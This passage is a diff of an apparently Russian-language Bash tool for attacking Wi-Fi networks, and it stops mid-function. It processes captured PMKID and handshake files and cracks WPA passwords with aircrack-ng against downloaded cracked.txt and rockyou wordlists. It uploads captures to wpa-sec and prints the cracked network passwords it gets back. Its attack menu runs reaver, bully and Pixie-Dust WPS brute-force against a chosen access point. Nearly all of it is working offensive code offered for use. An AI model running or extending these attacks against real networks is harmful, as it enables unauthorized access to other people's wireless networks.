+    echo -e "${GREEN}${BOLD}$(t pmk_stat_t)${NC}"
+    echo -e " ${YELLOW}$(t pmk_stat_net)${NC}    $n_net"
+    echo -e " ${GREEN}$(t pmk_stat_pmkid)${NC}    $n_pmkid"
+    echo -e " ${WHITE}$(t pmk_stat_useless)${NC} $n_useless"
+    echo -e " ${YELLOW}$(t pmk_stat_hs)${NC} $n_hs"
+    echo -e "\n ${WHITE}$(t pmk_saved_cap)${NC} $cap"
+
+    # хэш пойман? (по числу записанных пар или непустому файлу)
+    if [ "$n_pmkid" -eq 0 ] && [ ! -s "$hash" ]; then
+        echo -e "\n${YELLOW}$(t pmk_empty)${NC}"
+        press_any
+        # даже без свежего улова даём зайти в меню действий (выбрать любой файл)
+        pmkid_crack_menu "" "" "?"
+        return
+    fi
+    echo -e " ${GREEN}$(t pmk_hashok)${NC} $hash"
+    sleep 1; press_any
+
+    # ── Шаг 4: что делать с хэшем ──
+    pmkid_crack_menu "$hash" "$cap" "$essid"
+}
+
+# ── Вход "работа с готовым хэшем" (доступен всегда) ──
+# Сразу открывает меню действий; файл выбирается внутри при необходимости.
+pmkid_hash_entry() {
+    pmkid_crack_menu "" "" "?"
+}
+
+# Достаёт уникальные имена сетей (ESSID) из .22000 (они там в hex, поле 6).
+# $1 = путь к .pcapng или .22000. Печатает "SNR_2.4GHZ, PT_1423..." или пусто.
+essids_of() {
+    local f="$1" h22
+    case "$f" in
+        *.pcapng) h22="${f%.pcapng}.22000" ;;
+        *.22000)  h22="$f" ;;
+        *) return ;;
+    esac
+    # .22000 ещё нет (свежий захват) — создаём на лету, чтобы вытащить сети
+    if [ ! -s "$h22" ] && [ -s "$f" ] && command -v hcxpcapngtool >/dev/null 2>&1; then
+        case "$f" in *.pcapng)
+            hcxpcapngtool -o "$h22" "$f" >/dev/null 2>&1; fix_owner "$h22" 2>/dev/null ;;
+        esac
+    fi
+    [ -s "$h22" ] || return
+    local out=""
+    while read -r hx; do
+        [ -z "$hx" ] && continue
+        local name
+        # hex → текст: python если есть (надёжно для utf-8), иначе printf
+        if command -v python3 >/dev/null 2>&1; then
+            name=$(python3 -c "import sys;print(bytes.fromhex(sys.argv[1]).decode('utf-8','replace'))" "$hx" 2>/dev/null)
+        else
+            name=$(printf '%b' "$(printf '%s' "$hx" | sed 's/\(..\)/\\x\1/g')")
+        fi
+        [ -n "$name" ] && { [ -n "$out" ] && out="$out, $name" || out="$name"; }
+    done < <(awk -F'*' '{print $6}' "$h22" 2>/dev/null | sort -u)
+    printf '%s' "$out"
+}
+
+# Выбор файла захвата из папки pmkid. Печатает путь в stdout, или пусто.
+# Показываем ТОЛЬКО .pcapng (на wpa-sec грузится он; хэш из него достаётся сам),
+# а рядом — какие сети внутри (вытащенные из парного .22000).
+pmkid_pick_file() {
+    local hsel=0
+    while true; do
+        local files=() f
+        while IFS= read -r f; do [ -n "$f" ] && files+=("$f"); done < <(
+            ls -1t "$PMKID_DIR"/*.pcapng 2>/dev/null
+        )
+        clear; clear >&2
+        echo -e "${CYAN}${BOLD}  $(t pmk_pick_t)${NC}\n" >&2
+        if [ "${#files[@]}" -eq 0 ]; then
+            echo -e " ${YELLOW}$(t pmk_hash_none)${NC}\n" >&2
+            echo -e " ${WHITE}1${NC} $(t pmk_hash_manual)" >&2
+            echo -e " ${RED}2${NC} $(t back)\n" >&2
+            echo -e "${CYAN}$(t hint)${NC}" >&2
+            local key; key=$(read_key); local num="${key#num:}"
+            case "$key" in
+                esc) return 1 ;;
+                enter|num:*)
+                    case "$num" in
+                        1) local hp; prompt_input "$(t pmk_hash_path)" hp >&2 || continue
+                           [ -f "$hp" ] || { echo -e "${RED}$(t pmk_nofile)${NC}" >&2; sleep 2; continue; }
+                           printf '%s' "$hp"; return 0 ;;
+                        2) return 1 ;;
+                    esac ;;
+            esac
+            continue
+        fi
+        local i
+        for i in "${!files[@]}"; do
+            local base nets label
+            base=$(basename "${files[i]}")
+            nets=$(essids_of "${files[i]}")
+            # к имени добавляем сети внутри (если удалось вытащить)
+            if [ -n "$nets" ]; then label="${base}  →  ${nets}"; else label="$base"; fi
+            if [ "$i" -eq "$hsel" ]; then echo -e "${BG_SEL} $((i+1)) ${label} ${NC}" >&2
+            else echo -e "${WHITE} $((i+1)) ${base}${CYAN}  ${nets:+→ $nets}${NC}" >&2; fi
+        done
+        local n_manual=$(( ${#files[@]} + 1 ))
+        local n_back=$(( ${#files[@]} + 2 ))
+        if [ "$hsel" -eq $((n_manual-1)) ]; then echo -e "${BG_SEL} $n_manual $(t pmk_hash_manual) ${NC}" >&2
+        else echo -e "${CYAN} $n_manual $(t pmk_hash_manual)${NC}" >&2; fi
+        if [ "$hsel" -eq $((n_back-1)) ]; then echo -e "${BG_SEL} $n_back $(t back) ${NC}" >&2
+        else echo -e "${RED} $n_back $(t back)${NC}" >&2; fi
+        echo -e "\n${CYAN}$(t hint)${NC}" >&2
+        local total=$n_back
+        local key; key=$(read_key); local num="${key#num:}"
+        [ "$key" = "enter" ] && num=$((hsel+1))
+        case "$key" in
+            up)   ((hsel>0)) && ((hsel--)) ;;
+            down) ((hsel<total-1)) && ((hsel++)) ;;
+            esc)  return 1 ;;
+            enter|num:*)
+                [ "$num" -ge 1 ] && [ "$num" -le "$total" ] || continue
+                if [ "$num" -eq "$n_back" ]; then return 1
+                elif [ "$num" -eq "$n_manual" ]; then
+                    local hp; prompt_input "$(t pmk_hash_path)" hp >&2 || continue
+                    [ -f "$hp" ] || { echo -e "${RED}$(t pmk_nofile)${NC}" >&2; sleep 2; continue; }
+                    printf '%s' "$hp"; return 0
+                else
+                    printf '%s' "${files[$((num-1))]}"; return 0
+                fi ;;
+        esac
+    done
+}
+
+# Разложить файл на hash(.22000) + cap(.pcapng). Печатает "hash|cap".
+pmkid_split_file() {
+    local file="$1" hash cap
+    case "$file" in
+        *.22000) hash="$file"; cap="${file%.22000}.pcapng" ;;
+        *.pcapng)
+            cap="$file"; hash="${file%.pcapng}.22000"
+            if [ ! -s "$hash" ] && command -v hcxpcapngtool >/dev/null 2>&1; then
+                hcxpcapngtool -o "$hash" "$cap" >/dev/null 2>&1; fix_owner "$hash"
+            fi ;;
+        *) hash="$file"; cap="" ;;
+    esac
+    [ -s "$cap" ] || cap=""
+    printf '%s|%s' "$hash" "$cap"
+}
+
+# Меню действий с готовым хэшем
+pmkid_crack_menu() {
+    local hash="$1" cap="$2" essid_g="$3" csel=0
+    while true; do
+        # опции строим каждый раз: "сохранить" — только когда хэш уже на руках
+        local options=(
+            "${GREEN}|$(t pmk_check_base)"
+            "${CYAN}|$(t pmk_online)"
+        )
+        [ -s "$hash" ] && options+=("${WHITE}|$(t pmk_justsave)")
+        options+=("${RED}|$(t back)")
+        clear
+        echo -e "${CYAN}${BOLD}  $(t pmk_next_t)${NC}\n"
+        local i
+        for i in "${!options[@]}"; do
+            local color="${options[i]%%|*}" text="${options[i]#*|}"
+            if [ "$i" -eq "$csel" ]; then echo -e "${BG_SEL} $((i+1)) ${text} ${NC}"
+            else echo -e "${color} $((i+1)) ${text}${NC}"; fi
+        done
+        echo -e "\n${CYAN}$(t hint)${NC}"
+        local key; key=$(read_key); local num="${key#num:}"
+        [ "$key" = "enter" ] && num=$((csel+1))
+        case "$key" in
+            up)   ((csel>0)) && ((csel--)) ;;
+            down) ((csel<${#options[@]}-1)) && ((csel++)) ;;
+            esc)  return ;;
+            enter|num:*)
+                [ "$num" -ge 1 ] && [ "$num" -le "${#options[@]}" ] || continue
+                local sel_text="${options[$((num-1))]#*|}"
+                case "$sel_text" in
+                    "$(t pmk_check_base)")
+                       local h="$hash"
+                       if [ ! -s "$h" ]; then
+                           local pf; pf=$(pmkid_pick_file) || continue
+                           local hc; hc=$(pmkid_split_file "$pf"); h="${hc%%|*}"
+                       fi
+                       if [ ! -s "$h" ]; then
+                           clear; echo -e "\n${RED}$(t pmk_no_hash_in)${NC}"; press_any; continue
+                       fi
+                       pmkid_check_base "$h" ;;
+                    "$(t pmk_online)")
+                       # онлайн-меню открывается всегда; файл нужен только для "Залить"
+                       # и запрашивается уже внутри. Передаём что есть (может быть пусто).
+                       local up="$cap"; [ -s "$up" ] || up="$hash"
+                       pmkid_online_menu "$up" "$essid_g" ;;
+                    "$(t pmk_justsave)")
+                       echo -e "\n${GREEN}$(t pmk_hashok)${NC} $hash"; press_any; return ;;
+                    "$(t back)") return ;;
+                esac ;;
+        esac
+    done
+}
+
+# ── Проверка целостности gzip (весь архив, не только начало) ──
+_is_gzip() {
+    [ -s "$1" ] || return 1
+    local sig; sig=$(head -c2 "$1" 2>/dev/null | od -An -tx1 | tr -d ' ')
+    [ "$sig" = "1f8b" ] || return 1
+    gzip -t "$1" 2>/dev/null
+}
+
+# ── Автопоиск рабочего HTTP-прокси (НИЧЕГО не захардкожено) ──
+# Порядок: 1) системные http_proxy/https_proxy из окружения;
+#          2) типовые локальные порты прокси на localhost (Clash/v2ray/ss/privoxy).
+# Печатает URL первого отвечающего прокси, или пусто. Имя программы не важно —
+# проверяем только, слушает ли порт (через /dev/tcp).
+find_proxy() {
+    # 1) уже задан в окружении?
+    local envp="${https_proxy:-${http_proxy:-${HTTPS_PROXY:-${HTTP_PROXY:-}}}}"
+    if [ -n "$envp" ]; then printf '%s' "$envp"; return 0; fi
+    # 2) сканируем типовые локальные порты
+    local host p
+    for host in 127.0.0.1 localhost; do
+        for p in 7890 7897 1080 8080 8118 10809 20171 2080; do
+            # порт отвечает? (bash /dev/tcp, таймаут 1с)
+            if timeout 1 bash -c "exec 3<>/dev/tcp/$host/$p" 2>/dev/null; then
+                printf 'http://%s:%s' "$host" "$p"; return 0
+            fi
+        done
+    done
+    return 1
+}
+
+# ── Универсальная загрузка словаря: прямо → любой прокси → ручная инструкция ──
+# $1=url  $2=dest(без .gz)  $3=имя_для_вывода  $4=force?  $5=ключ_перевода_"зачем"
+# Возвращает 0 если словарь готов, иначе 1 (+печатает подробную инструкцию).
+fetch_dict() {
+    local url="$1" dest="$2" name="$3" force="${4:-}" why="${5:-}"
+    if [ -s "$dest" ] && [ "$force" != "force" ]; then return 0; fi
+    local gz="$dest.gz"
+    rm -f "$gz" 2>/dev/null
+
+    # Этап 1 — быстрая проба напрямую: 1 попытка, короткий таймаут (не виснуть)
+    echo -e "${YELLOW}$(t dl_direct) ${WHITE}$name${NC}...\n"
+    wget --tries=1 --timeout=8 --show-progress -q -O "$gz" "$url"
+
+    # Этап 2 — не вышло за 8с → сразу прокси (не долбим повторно напрямую)
+    if ! _is_gzip "$gz"; then
+        rm -f "$gz" 2>/dev/null
+        local px; px=$(find_proxy)
+        if [ -n "$px" ]; then
+            echo -e "\n${YELLOW}$(t dl_via_proxy)${NC} ${WHITE}$px${NC}\n"
+            https_proxy="$px" http_proxy="$px" \
+                wget --tries=3 --timeout=30 --continue --show-progress -q -O "$gz" "$url"
+        else
+            echo -e "\n${YELLOW}$(t dl_no_proxy)${NC}"
+        fi
+    fi
+
+    # Готово?
+    if _is_gzip "$gz"; then
+        echo -e "\n${YELLOW}$(t base_unpack)${NC}"
+        gunzip -f "$gz" 2>/dev/null
+        fix_owner "$dest"
+        if [ -s "$dest" ]; then
+            local sz; sz=$(du -h "$dest" 2>/dev/null | cut -f1)
+            echo -e "${GREEN}$(t base_ok)${NC} ${WHITE}$dest ($sz)${NC}"
+            return 0
+        fi
+    fi
+
+    # Не удалось — подробная инструкция: что, где, под каким названием, зачем
+    rm -f "$gz" 2>/dev/null
+    echo -e "\n${RED}${BOLD}$(t dl_fail_manual) ($name)${NC}"
+    echo -e "${YELLOW}$(t "$why")${NC}\n"
+    echo -e "${WHITE}$(t dl_url)${NC}\n  ${CYAN}$url${NC}"
+    echo -e "${WHITE}$(t dl_unpack_to)${NC}\n  ${CYAN}$dest${NC}"
+    echo -e "${WHITE}$(t dl_hint_cmd)${NC}"
+    echo -e "  ${CYAN}wget -O '$gz' '$url' && gunzip '$gz'${NC}"
+    echo -e "${WHITE}$(t dl_after)${NC}"
+    return 1
+}
+
+# URL источников словарей (без прокси в коде — прокси ищется на лету)
+CRACKED_URL="https://wpa-sec.stanev.org/dict/cracked.txt.gz"
+ROCKYOU_BASE="$DATA_DIR/rockyou.txt"
+ROCKYOU_URL="https://raw.githubusercontent.com/teamstealthsec/wordlists/master/rockyou.txt.gz"
+# Обёртки: 5-й арг — ключ перевода "зачем нужен файл / что сломается без него"
+download_cracked_base() { fetch_dict "$CRACKED_URL" "$CRACKED_BASE" "cracked.txt" "${1:-}" "why_cracked"; }
+download_rockyou()      { fetch_dict "$ROCKYOU_URL" "$ROCKYOU_BASE" "rockyou.txt" "${1:-}" "why_rockyou"; }
+
+# Проверка хэша по словарям: этап 1 — cracked.txt (мгновенно),
+# этап 2 (по желанию) — rockyou (~14 млн, дольше). Онлайн — отдельным пунктом меню.
+pmkid_check_base() {
+    local hash="$1"
+    clear
+    # ── Этап 1: cracked.txt (быстрая база засвеченных паролей) ──
+    if [ ! -s "$CRACKED_BASE" ]; then
+        download_cracked_base || { press_any; return; }
+    fi
+    echo -e "\n${YELLOW}$(t stage1_run)${NC}\n"
+    local res
+    res=$(aircrack-ng -w "$CRACKED_BASE" "$hash" 2>/dev/null | grep -i 'KEY FOUND')
+    if [ -n "$res" ]; then
+        echo -e "${GREEN}${BOLD}$(t pmk_cracked)${NC}"
+        echo -e "${GREEN}$res${NC}"
+        press_any; return
+    fi
+    echo -e "${YELLOW}$(t stage1_miss)${NC}\n"
+
+    # ── Этап 2: rockyou (большой словарь) — спрашиваем, т.к. дольше ──
+    echo -e "${CYAN}$(t stage2_ask)${NC}"
+    echo -e "${WHITE}[Enter]${NC} $(t yes)   ${WHITE}[Esc/n]${NC} $(t no)"
+    local k; IFS= read -rsn1 k
+    case "$k" in
+        n|N|т|Т|$'\e') echo -e "\n${YELLOW}$(t stage2_skip)${NC}"; press_any; return ;;
+    esac
+    # rockyou есть? нет — качаем (fetch_dict сам покажет инструкцию если не выйдет)
+    if [ ! -s "$ROCKYOU_BASE" ]; then
+        download_rockyou || { press_any; return; }
+    fi
+    echo -e "\n${YELLOW}$(t stage2_run)${NC}"
+    echo -e "${WHITE}$(t stage2_wait)${NC}\n"
+    res=$(aircrack-ng -w "$ROCKYOU_BASE" "$hash" 2>/dev/null | grep -i 'KEY FOUND')
+    if [ -n "$res" ]; then
+        echo -e "${GREEN}${BOLD}$(t pmk_cracked)${NC}"
+        echo -e "${GREEN}$res${NC}"
+    else
+        echo -e "${YELLOW}$(t pmk_notcracked)${NC}"
+    fi
+    press_any
+}
+
+# ── Онлайн (wpa-sec): меню залить / проверить / журнал ──
+WPASEC_LOG="$WPASEC_DIR/wpasec_uploads.txt"
+
+# Получить/спросить ключ wpa-sec (один раз)
+wpasec_get_key(){
+    local key=""
+    [ -f "$WPASEC_KEY_FILE" ] && key=$(cat "$WPASEC_KEY_FILE" 2>/dev/null)
+    if [ -z "$key" ]; then
+        # весь UI — в stderr, чтобы в stdout ушёл ТОЛЬКО ключ (мы в $(...))
+        echo -e "${YELLOW}$(t pmk_need_key)${NC}" >&2
+        echo -e "${CYAN}https://wpa-sec.stanev.org/ ${NC}" >&2
+        prompt_input "wpa-sec key:" key >&2 || return 1
+        [ -z "$key" ] && return 1
+        echo "$key" > "$WPASEC_KEY_FILE"; fix_owner "$WPASEC_KEY_FILE"
+    fi
+    printf '%s' "$key"
+}
+
+pmkid_online_menu(){
+    local cap="$1" essid="$2" osel=0
+    local options=(
+        "${GREEN}|$(t pmk_up_new)"
+        "${CYAN}|$(t pmk_up_check)"
+        "${WHITE}|$(t pmk_up_log)"
+        "${RED}|$(t atk_cancel)"
+    )
+    while true; do
+        clear
+        echo -e "${CYAN}${BOLD}  $(t pmk_online)${NC}\n"
+        local i
+        for i in "${!options[@]}"; do
+            local color="${options[i]%%|*}" text="${options[i]#*|}"
+            if [ "$i" -eq "$osel" ]; then echo -e "${BG_SEL} $((i+1)) ${text} ${NC}"
+            else echo -e "${color} $((i+1)) ${text}${NC}"; fi
+        done
+        echo -e "\n${CYAN}$(t hint)${NC}"
+        local key; key=$(read_key); local num="${key#num:}"
+        [ "$key" = "enter" ] && num=$((osel+1))
+        case "$key" in
+            up)   ((osel>0)) && ((osel--)) ;;
+            down) ((osel<${#options[@]}-1)) && ((osel++)) ;;
+            esc)  return ;;
+            enter|num:*)
+                case "$num" in
+                    1) pmkid_upload_online "$cap" "$essid"; press_any ;;
+                    2) pmkid_check_results; press_any ;;
+                    3) pmkid_show_log; press_any ;;
+                    4) return ;;
+                esac ;;
+        esac
+    done
+}
+
+# ── curl к wpa-sec с прокси-fallback ──
+# Возврат: 0 = ДОЗВОНИЛИСЬ (даже если тело пустое — просто нет данных);
+#          1 = реальная сетевая ошибка (сервер недоступен).
+# Тело ответа печатается в stdout (может быть пустым при успехе).
+# У Shah прокси уже в окружении (https_proxy), curl берёт его сам — но на
+# случай отсутствия пробуем ещё и явные схемы.
+wpasec_curl() {
+    command -v curl >/dev/null 2>&1 || return 1
+    local out rc
+    # этап 1 — как есть (curl сам подхватит http_proxy/https_proxy из окружения)
+    out=$(curl -s --connect-timeout 8 --max-time 60 "$@" 2>/dev/null); rc=$?
+    if [ $rc -eq 0 ]; then printf '%s' "$out"; return 0; fi   # дозвонились (тело может быть пустым)
+    # этап 2 — окружение не помогло → пробуем явные схемы прокси
+    local px; px=$(find_proxy)
+    if [ -n "$px" ]; then
+        local hostport="${px#http://}"; hostport="${hostport#https://}"; hostport="${hostport#socks5://}"; hostport="${hostport#socks5h://}"
+        local scheme
+        for scheme in "http://$hostport" "socks5h://$hostport"; do
+            out=$(curl -s --connect-timeout 8 --max-time 60 --proxy "$scheme" "$@" 2>/dev/null); rc=$?
+            if [ $rc -eq 0 ]; then printf '%s' "$out"; return 0; fi
+        done
+    fi
+    return 1
+}
+# Для заливки — возвращает 0 при успешном дозвоне.
+wpasec_curl_ok() {
+    command -v curl >/dev/null 2>&1 || return 1
+    curl -s --connect-timeout 8 --max-time 120 "$@" >/dev/null 2>&1 && return 0
+    local px; px=$(find_proxy)
+    if [ -n "$px" ]; then
+        local hostport="${px#http://}"; hostport="${hostport#https://}"; hostport="${hostport#socks5://}"; hostport="${hostport#socks5h://}"
+        local scheme
+        for scheme in "http://$hostport" "socks5h://$hostport"; do
+            curl -s --connect-timeout 8 --max-time 120 --proxy "$scheme" "$@" >/dev/null 2>&1 && return 0
+        done
+    fi
+    return 1
+}
+
+# ── Проверка результата захвата handshake (airodump .cap) + яркое оповещение ──
+# $1 = базовое имя (без -01.cap). Проверяет пойман ли handshake через aircrack-ng.
+check_handshake_result() {
+    local base="$1"
+    # airodump пишет base-01.cap (или -02 при повторах) — берём свежий
+    local cap; cap=$(ls -1t "${base}"*.cap 2>/dev/null | head -1)
+    clear
+    echo -e "${CYAN}${BOLD}========================================${NC}"
+    echo -e "${CYAN}${BOLD}     $(t hs_result_t)     ${NC}"
+    echo -e "${CYAN}${BOLD}========================================${NC}\n"
+    if [ -z "$cap" ] || [ ! -s "$cap" ]; then
+        echo -e "${RED}${BOLD}✖ $(t hs_no_cap)${NC}"
+        return
+    fi
+    # aircrack-ng показывает "(1 handshake)" рядом с сетью если рукопожатие есть
+    local info; info=$(aircrack-ng "$cap" 2>/dev/null)
+    if printf '%s' "$info" | grep -qiE '\([1-9][0-9]* handshake'; then
+        echo -e "${GREEN}${BOLD}✔✔✔  $(t hs_caught)  ✔✔✔${NC}\n"
+        echo -e "${WHITE}$(t hs_file_at)${NC} ${CYAN}$cap${NC}"
+        echo -e "${WHITE}$(t hs_next)${NC}"
+        echo -e "  ${GREEN}$(t hs_next_crack)${NC}"
+        echo -e "  ${GREEN}$(t hs_next_online)${NC}"
+    else
+        echo -e "${YELLOW}${BOLD}✖ $(t hs_not_caught)${NC}\n"
+        echo -e "${WHITE}$(t hs_why)${NC}"
+        echo -e "  ${YELLOW}• $(t hs_why1)${NC}"
+        echo -e "  ${YELLOW}• $(t hs_why2)${NC}"
+        echo -e "${WHITE}$(t hs_tip_deauth)${NC}"
+    fi
+}
+
+# ── Анализ содержимого захвата (что внутри: PMKID / M1M2 / полный handshake) ──
+# Через hcxpcapngtool (только читает, файл НЕ трогаем). Печатает сводку на экран
+# и возвращает 0 если есть хоть что-то заливаемое (PMKID или EAPOL-пара), иначе 1.
+analyze_capture() {
+    local cap="$1"
+    command -v hcxpcapngtool >/dev/null 2>&1 || return 0   # нет тула — не мешаем заливке
+    local info; info=$(hcxpcapngtool -o /dev/null "$cap" 2>&1)
+    # вытаскиваем метрики (строки вида "EAPOL M3 messages (total).....: N")
+    local getval; getval(){ echo "$info" | grep -iE "$1" | grep -oP ':\s*\K[0-9]+' | head -1; }
+    local m1 m2 m3 m4 pmkid pairs
+    m1=$(getval 'EAPOL M1 messages'); m2=$(getval 'EAPOL M2 messages')
+    m3=$(getval 'EAPOL M3 messages'); m4=$(getval 'EAPOL M4 messages')
+    pmkid=$(getval 'PMKID.*written to 22000|written to 22000'); pairs=$(getval 'EAPOL pairs \(best\)|EAPOL pairs \(total\)')
+    # RSN PMKID (total) — сколько PMKID вообще
+    local pmkid_total; pmkid_total=$(getval 'RSN PMKID \(total\)|PMKID \(total\)')
+    for v in m1 m2 m3 m4 pmkid pairs pmkid_total; do [ -z "${!v}" ] && eval "$v=0"; done
+
+    echo -e "${CYAN}${BOLD}$(t an_title)${NC}"
+    echo -e "${WHITE}------------------------------------${NC}"
+    echo -e " ${WHITE}$(t an_pmkid)${NC} ${pmkid_total}"
+    echo -e " ${WHITE}M1:${NC} $m1   ${WHITE}M2:${NC} $m2   ${WHITE}M3:${NC} $m3   ${WHITE}M4:${NC} $m4"
+    echo -e "${WHITE}------------------------------------${NC}"
+
+    # вердикт (полный handshake = есть M3; одна M4 без M3 пары не образует)
+    if [ "$m3" -gt 0 ]; then
+        echo -e " ${GREEN}${BOLD}$(t an_full)${NC}"        # есть M3 = полный handshake
+        return 0
+    elif [ "$pmkid_total" -gt 0 ] || { [ "$m1" -gt 0 ] && [ "$m2" -gt 0 ]; }; then
+        echo -e " ${YELLOW}$(t an_pmkid_only)${NC}"        # только PMKID / M1M2
+        return 0
+    else
+        echo -e " ${RED}$(t an_empty)${NC}"                # ничего заливаемого
+        return 1
+    fi
+}
+
+# Заливка файла на wpa-sec + запись в журнал.
+# Формат по официальному upload-скрипту: POST на КОРЕНЬ https://wpa-sec.stanev.org
+# с cookie key=<ключ> и multipart-полем file=@<pcapng>. НЕ /?submit.
+pmkid_upload_online() {
+    local cap="$1" essid="${2:-?}" key
+    clear
+    key=$(wpasec_get_key) || return
+    # файл не передан (зашли из онлайн-меню напрямую) — выбираем
+    if [ ! -f "$cap" ]; then
+        local pf; pf=$(pmkid_pick_file) || return
+        local hc; hc=$(pmkid_split_file "$pf")
+        cap="${hc##*|}"; [ -f "$cap" ] || cap="${hc%%|*}"
+    fi
+    [ -f "$cap" ] || { echo -e "\n${RED}$(t pmk_nofile)${NC}"; return; }
+    # только .pcapng — сервер принимает pcap-формат, не .22000
+    case "$cap" in
+        *.pcapng|*.pcap|*.cap) : ;;
+        *) echo -e "\n${RED}$(t pmk_only_pcap)${NC}"; return ;;
+    esac
+    # ── Анализ содержимого перед заливкой (что реально внутри) ──
+    echo ""
+    analyze_capture "$cap"; local acode=$?
+    if [ $acode -ne 0 ]; then
+        # совсем ничего заливаемого — спросим, продолжать ли
+        echo -e "\n${YELLOW}$(t an_ask_anyway)${NC}"
+        echo -e "${WHITE}[Enter]${NC} $(t yes)   ${WHITE}[Esc/n]${NC} $(t no)"
+        local k; IFS= read -rsn1 k
+        case "$k" in n|N|т|Т|$'\e') return ;; esac
+    fi
+    echo -e "\n${YELLOW}$(t pmk_uploading)${NC}"
+    local resp rc
+    resp=$(wpasec_curl --cookie "key=$key" -F "file=@$cap" "https://wpa-sec.stanev.org"); rc=$?
+    if [ $rc -ne 0 ]; then
+        echo -e "${RED}$(t pmk_upfail)${NC}"
+        echo -e "${YELLOW}$(t pmk_up_manual)${NC}"
+    else
+        # сервер ответил. Разбираем что именно (принято / уже было / ошибка).
+        echo -e "${GREEN}$(t pmk_sent)${NC}"
+        if [ -n "$resp" ]; then
+            # показываем ответ сервера как есть (короткий текст: OK / already submitted / ...)
+            local short; short=$(printf '%s' "$resp" | grep -viE '<|>|^$' | head -3)
+            [ -n "$short" ] && echo -e "${WHITE}$(t pmk_srv_said)${NC} ${CYAN}${short}${NC}"
+        fi
+        echo -e "${YELLOW}$(t pmk_sent_note)${NC}"
+        echo "$(date '+%Y-%m-%d %H:%M') | $essid | $(basename "$cap") | sent" >> "$WPASEC_LOG"
+        fix_owner "$WPASEC_LOG"
+    fi
+    echo -e "\n${WHITE}$(t pmk_your_link)${NC}"
+    echo -e "${CYAN}https://wpa-sec.stanev.org/?my_nets=&page=1${NC}"
+}
+
+# Проверить результаты онлайн (какие сети уже взломаны).
+# Правильный эндпоинт (по офиц. скрипту): GET /?api&dl=1 с cookie key=<ключ>.
+# Отдаёт potfile — только ВЗЛОМАННЫЕ: строки bssid:mac:essid:password.
+pmkid_check_results() {
+    local key
+    clear
+    key=$(wpasec_get_key) || return
+    echo -e "\n${YELLOW}$(t pmk_checking)${NC}\n"
+    local out rc
+    out=$(wpasec_curl --cookie "key=$key" "https://wpa-sec.stanev.org/?api&dl=1"); rc=$?
+    # rc≠0 — реальная сетевая ошибка (сервер недоступен)
+    if [ $rc -ne 0 ]; then
+        echo -e "${RED}$(t pmk_no_net)${NC}"
+        echo -e "\n${WHITE}$(t pmk_your_link)${NC}"
+        echo -e "${CYAN}https://wpa-sec.stanev.org/?my_nets=&page=1${NC}"
+        return
+    fi
+    # дозвонились. Пустой ответ = взломанных сетей пока нет (всё в очереди).
+    if [ -z "$out" ] || ! printf '%s' "$out" | grep -q ':'; then
+        echo -e "${GREEN}$(t pmk_res_ok)${NC}"
+        echo -e "${YELLOW}$(t pmk_res_none_cracked)${NC}"
+        echo -e "\n${WHITE}$(t pmk_your_link)${NC}"
+        echo -e "${CYAN}https://wpa-sec.stanev.org/?my_nets=&page=1${NC}"
+        return
+    fi
+    # potfile-формат: bssid:mac_client:essid:password — все они ВЗЛОМАНЫ
+    echo -e "${GREEN}${BOLD}$(t pmk_res_have)${NC}\n"
+    local line essid pass
+    while IFS= read -r line; do
+        [ -z "$line" ] && continue
+        essid=$(printf '%s' "$line" | cut -d: -f3)
+        pass=$(printf '%s' "$line" | cut -d: -f4-)
+        [ -n "$essid$pass" ] && echo -e " ${GREEN}${BOLD}[$(t pmk_res_cracked)]${NC} ${essid}  →  ${GREEN}$pass${NC}"
+    done <<< "$out"
+    echo -e "\n${WHITE}$(t pmk_your_link)${NC}"
+    echo -e "${CYAN}https://wpa-sec.stanev.org/?my_nets=&page=1${NC}"
+}
+
+# Показать журнал заливок (работает офлайн — читает файл)
+pmkid_show_log() {
+    clear
+    echo -e "${CYAN}${BOLD}  $(t pmk_up_log)${NC}\n"
+    if [ ! -s "$WPASEC_LOG" ]; then
+        echo -e " ${YELLOW}$(t pmk_log_empty)${NC}"
+        return
+    fi
+    echo -e " ${WHITE}$(t pmk_log_hdr)${NC}"
+    echo -e "${CYAN}----------------------------------------${NC}"
+    cat "$WPASEC_LOG"
+    # ссылка (если ключ есть)
+    if [ -f "$WPASEC_KEY_FILE" ]; then
+        echo -e "\n${WHITE}$(t pmk_your_link)${NC}"
+        echo -e "${CYAN}https://wpa-sec.stanev.org/?my_nets=&page=1${NC}"
+    fi
+}
+
+
+scan_attack_menu() {
+    local idx="$1"
+    local b="${SCAN_BSSID[idx]}" ch="${SCAN_CH[idx]}" essid="${SCAN_ESSID[idx]}"
+    # выставляем цель для существующих функций/сохранения
+    TARGET_BSSID="$b"; TARGET_CHANNEL="$ch"
+    local asel=0
+    while true; do
+        local options=(
+            "${WHITE}|$(t atk_pixie)"
+            "${WHITE}|$(t atk_reaver)"
+            "${WHITE}|$(t atk_bully)"
+            "${WHITE}|$(t atk_hs)"
+            "${WHITE}|$(t atk_pmkid)"
+            "${GREEN}|$(t atk_note)"
+            "${RED}|$(t atk_cancel)"
+        )
+        clear
+        echo -e "${CYAN}${BOLD}========================================${NC}"
+        echo -e "${CYAN}${BOLD}      $(t atk_t)      ${NC}"
+        echo -e "${CYAN}${BOLD}========================================${NC}"
+        echo -e " ${YELLOW}ESSID:${NC} $essid"
+        echo -e " ${YELLOW}BSSID:${NC} $b   ${YELLOW}Ch:${NC} $ch\n"
+        local i
+        for i in "${!options[@]}"; do
+            local color="${options[i]%%|*}" text="${options[i]#*|}"
+            if [ "$i" -eq "$asel" ]; then
+                echo -e "${BG_SEL} $((i+1)) ${text} ${NC}"
+            else
+                echo -e "${color} $((i+1)) ${text}${NC}"
+            fi
+        done
+        echo -e "\n${CYAN}$(t hint)${NC}"
+        local key; key=$(read_key); local num="${key#num:}"
+        [ "$key" = "enter" ] && num=$((asel+1))
+        case "$key" in
+            up)   ((asel>0)) && ((asel--)) ;;
+            down) ((asel<${#options[@]}-1)) && ((asel++)) ;;
+            esc)  return ;;
+            enter|num:*)
+                case "$num" in
+                    1) local tag st; tag=$(sanitize_tag "$essid" "$b"); st=$(stamp_now)
+                       RUN_LOG="$PIXIE_DIR/pixie_${tag}_${st}.log"
+                       run_cmd "reaver -i $MON -b $b -c $ch -K -d 2 -t 5 -N -vv" ;;
+                    2) local tag st; tag=$(sanitize_tag "$essid" "$b"); st=$(stamp_now)
+                       RUN_LOG="$REAVER_DIR/reaver_${tag}_${st}.log"
+                       run_cmd "reaver -i $MON -b $b -c $ch -d 2 -t 10 -N -vv" ;;
+                    3) local B; if B=$(get_bully); then
+                           local tag st; tag=$(sanitize_tag "$essid" "$b"); st=$(stamp_now)
